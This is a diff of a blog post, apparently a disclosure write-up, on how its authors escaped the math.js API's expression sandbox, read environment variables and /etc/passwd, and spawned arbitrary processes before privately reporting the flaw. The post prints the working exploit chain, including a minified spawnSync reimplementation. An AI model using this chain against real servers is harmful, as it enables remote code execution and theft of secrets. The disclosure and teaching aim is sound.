@@ -44,20 +44,25 @@
 <p>This article explains in short how we found, exploited and reported a remote code execution (RCE) vulnerability. It is meant to be a guide to finding vulnerabilities, as well as reporting them in a responsible manner.</p>
 <h2 id="step-one-discovery">Step one: discovery</h2>
 <p>While playing around with <a href="https://github.com/LucentW/s-uzzbot/blob/master/plugins/calculator.lua">a wrapper</a> of the math.js API (<code>http://api.mathjs.org/v1/?expr=expression-here</code>), we discovered that it <strong>appears to evaluate JavaScript</strong>, though with some restrictions:</p>
-<pre><code>!calc cos
+<pre><code>&gt; !calc cos
 Result: function
-!calc eval
+
+&gt; !calc eval
 Result: function
-!calc eval(&quot;x =&gt; x&quot;)
+
+&gt; !calc eval(&quot;x =&gt; x&quot;)
 Error: Value expected (char 3)
-!calc eval(&quot;console.log&quot;)
+
+&gt; !calc eval(&quot;console.log&quot;)
 Error: Undefined symbol console
-!calc eval(&quot;return 1&quot;)
+
+&gt; !calc eval(&quot;return 1&quot;)
 Result: 1</code></pre>
 <p>In particular, it seems that <code>eval</code> was replaced with a safe version. <code>Function</code> and <code>setTimeout</code>/<code>setInterval</code> didn't work, either:</p>
-<pre><code>!calc Function(&quot;return 1&quot;)
+<pre><code>&gt; !calc Function(&quot;return 1&quot;)
 Error: Undefined symbol Function
-!calc setTimeout
+
+&gt; !calc setTimeout
 Error: Undefined symbol Function</code></pre>
 <h2 id="step-two-exploitation">Step two: exploitation</h2>
 <blockquote>
@@ -75,31 +80,68 @@ Error: Undefined symbol Function</code></pre>
 <p>For example, <code>Function(&quot;return 1&quot;)</code> can be replaced with <code>Math.floor.constructor(&quot;return 1&quot;)</code>. Therefore, to evaluate <code>return 1</code>, we can use <code>Math.floor.constructor(&quot;return 1&quot;)()</code>.</p>
 </blockquote>
 <p>We know that in the math.js environment <code>cos</code> is defined as a function, so we used that:</p>
-<pre><code>!calc cos.constructor(&quot;return 1&quot;)()
+<pre><code>&gt; !calc cos.constructor(&quot;return 1&quot;)()
 Result: 1</code></pre>
 <p>Success!</p>
 <p>From here we could have simply <code>require</code>-d some native modules and gained access to the OS, right? Not so fast: although the math.js API server runs in a Node.js environment, for whatever reason we couldn't use <code>require</code>.</p>
-<pre><code>!calc cos.constructor(&quot;return require&quot;)()
+<pre><code>&gt; !calc cos.constructor(&quot;return require&quot;)()
 Error: require is not defined</code></pre>
 <p>However, we could use <code>process</code>, which has <a href="https://nodejs.org/api/process.html">a few nifty features</a>:</p>
-<pre><code>!calc cos.constructor(&quot;return process&quot;)()
+<pre><code>&gt; !calc cos.constructor(&quot;return process&quot;)()
 Result: [object process]
-!calc cos.constructor(&quot;return process.env&quot;)()
-Result: {&quot;WEB_MEMORY&quot;: &quot;512&quot;, &quot;MEMORY_AVAILABLE&quot;: &quot;512&quot;, &quot;NEW_RELIC_LOG&quot;: &quot;stdout&quot;, &quot;NEW_RELIC_LICENSE_KEY&quot;: &quot;&lt;censored&gt;&quot;, &quot;DYNO&quot;: &quot;web.1&quot;, &quot;PAPERTRAIL_API_TOKEN&quot;: &quot;&lt;censored&gt;&quot;, &quot;PATH&quot;: &quot;/app/.heroku/node/bin:/app/.heroku/yarn/bin:bin:node_modules/.bin:/usr/local/bin:/usr/bin:/bin:/app/bin:/app/node_modules/.bin&quot;, &quot;WEB_CONCURRENCY&quot;: &quot;1&quot;, &quot;PWD&quot;: &quot;/app&quot;, &quot;NODE_ENV&quot;: &quot;production&quot;, &quot;PS1&quot;: &quot;\[\033[01;34m\]\w\[\033[00m\] \[\033[01;32m\]$ \[\033[00m\]&quot;, &quot;SHLVL&quot;: &quot;1&quot;, &quot;HOME&quot;: &quot;/app&quot;, &quot;PORT&quot;: &quot;&lt;censored&gt;&quot;, &quot;NODE_HOME&quot;: &quot;/app/.heroku/node&quot;, &quot;_&quot;: &quot;/app/.heroku/node/bin/node&quot;}</code></pre>
+
+&gt; !calc cos.constructor(&quot;return process.env&quot;)()
+Result: {
+  &quot;WEB_MEMORY&quot;: &quot;512&quot;,
+  &quot;MEMORY_AVAILABLE&quot;: &quot;512&quot;,
+  &quot;NEW_RELIC_LOG&quot;: &quot;stdout&quot;,
+  &quot;NEW_RELIC_LICENSE_KEY&quot;: &quot;&lt;censored&gt;&quot;,
+  &quot;DYNO&quot;: &quot;web.1&quot;,
+  &quot;PAPERTRAIL_API_TOKEN&quot;: &quot;&lt;censored&gt;&quot;,
+  &quot;PATH&quot;: &quot;/app/.heroku/node/bin:/app/.heroku/yarn/bin:bin:node_modules/.bin:/usr/local/bin:/usr/bin:/bin:/app/bin:/app/node_modules/.bin&quot;,
+  &quot;WEB_CONCURRENCY&quot;: &quot;1&quot;,
+  &quot;PWD&quot;: &quot;/app&quot;,
+  &quot;NODE_ENV&quot;: &quot;production&quot;,
+  &quot;PS1&quot;: &quot;\[\033[01;34m\]\w\[\033[00m\] \[\033[01;32m\]$ \[\033[00m\]&quot;,
+  &quot;SHLVL&quot;: &quot;1&quot;,
+  &quot;HOME&quot;: &quot;/app&quot;,
+  &quot;PORT&quot;: &quot;&lt;censored&gt;&quot;,
+  &quot;NODE_HOME&quot;: &quot;/app/.heroku/node&quot;,
+  &quot;_&quot;: &quot;/app/.heroku/node/bin/node&quot;
+}</code></pre>
 <p>Though <code>process.env</code> contains some bits of juicy info, it can't really do anything interesting: we need to go deeper and use <a href="http://stackoverflow.com/q/24042861"><code>process.binding</code></a>, which exposes Javascript bindings to the OS. Though they are not officially documented and are meant for internal usage, one can reconstruct their behaviour from reading through the Node.js source code. For example, we can use <code>process.binding(&quot;fs&quot;)</code> to read arbitrary files on the OS (with the appropriate permissions):</p>
 <blockquote>
 <p>For brevity, we'll skip the <code>!calc cos.constructor(&quot;code&quot;)</code> wrapper, and paste the relevant JS code instead.</p>
 </blockquote>
-<pre><code>buffer = Buffer.allocUnsafe(8192); process.binding(&#39;fs&#39;).read(process.binding(&#39;fs&#39;).open(&#39;/etc/passwd&#39;, 0, 0600), buffer, 0, 4096); return buffer
-Result: root:x:0:0:root:/root:/bin/bash
+<pre><code>&gt; buffer = Buffer.allocUnsafe(8192); process.binding(&#39;fs&#39;).read(process.binding(&#39;fs&#39;).open(&#39;/etc/passwd&#39;, 0, 0600), buffer, 0, 4096); return buffer
+root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
 sys:x:3:3:sys:/dev:/bin/sh
 &lt;more users...&gt;</code></pre>
 <p>We're almost done: now we need to figure out a way to open a shell and run arbitrary commands. If you have experience with Node.js, you may know about <a href="https://nodejs.org/api/child_process.html"><code>child_process</code></a>, which can be used to spawn processes with <code>spawnSync</code>: we just need to replicate this feature using OS bindings (remember that we can't use <code>require</code>).</p>
-<p>This is easier than it seems: you can just take <a href="https://github.com/nodejs/node/blob/master/lib/child_process.js">the source code for <code>child_process</code></a>, remove the code you don't need (unused functions and error handling), minify it, and run it through the API (<a href="https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822">code here</a>). From here, <strong>we can spawn arbitrary processes</strong> and run shell commands:</p>
-<pre><code>return spawnSync(&#39;/usr/bin/whoami&#39;);
-Result: {&quot;status&quot;: 0, &quot;signal&quot;: null, &quot;output&quot;: [null, u15104, ], &quot;pid&quot;: 100, &quot;stdout&quot;: u15104, &quot;stderr&quot;: }</code></pre>
+<p>This is easier than it seems: you can just take <a href="https://github.com/nodejs/node/blob/master/lib/child_process.js">the source code for <code>child_process</code></a>, remove the code you don't need (unused functions and error handling), minify it, and run it through the API.</p>
+<script src="https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822.js"></script>
+<noscript>
+<pre><code>// Source: https://github.com/nodejs/node/blob/master/lib/child_process.js
+
+// Defines spawn_sync and normalizeSpawnArguments (without error handling). These are internal variables.
+spawn_sync = process.binding(&#39;spawn_sync&#39;); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&amp;&amp;(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(&#39; &#39;);typeof a.shell===&#39;string&#39;?c=a.shell:c=&#39;/bin/sh&#39;,b=[&#39;-c&#39;,g];}typeof a.argv0===&#39;string&#39;?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+&#39;=&#39;+d[f]);return{file:c,args:b,options:a,envPairs:e};}
+
+// Defines spawnSync, the function that will do the actual spawning
+spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:&#39;pipe&#39;,readable:!0,writable:!1},{type:&#39;pipe&#39;,readable:!1,writable:!0},{type:&#39;pipe&#39;,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c&lt;a.stdio.length;c++){var e=a.stdio[c]&amp;&amp;a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&amp;&amp;a.encoding&amp;&amp;a.encoding!==&#39;buffer&#39;)for(c=0;c&lt;b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&amp;&amp;b.output[1],b.stderr=b.output&amp;&amp;b.output[2],b.error&amp;&amp;(b.error= b.error + &#39;spawnSync &#39;+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}</code></pre>
+<small>Gist [here](https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822</small>
+</noscript>
+<p>From here, <strong>we can spawn arbitrary processes</strong> and run shell commands:</p>
+<pre><code>&gt; return spawnSync(&#39;/usr/bin/whoami&#39;);
+{
+  &quot;status&quot;: 0,
+  &quot;signal&quot;: null,
+  &quot;output&quot;: [null, u15104, ],
+  &quot;pid&quot;: 100,
+  &quot;stdout&quot;: u15104,
+  &quot;stderr&quot;:
+}</code></pre>
 <h2 id="step-three-reporting">Step three: reporting</h2>
 <p>Now that we found a vulnerability and exploited it to the largest extent possible, we had to decide what to do with it. Since we exploited it for fun and have no malicious intents, we took the &quot;white hat&quot; road and reported it to the maintainer. We <strong>contacted him privately</strong> through the e-mail address listed on his GitHub profile with the following details:</p>
 <ul>
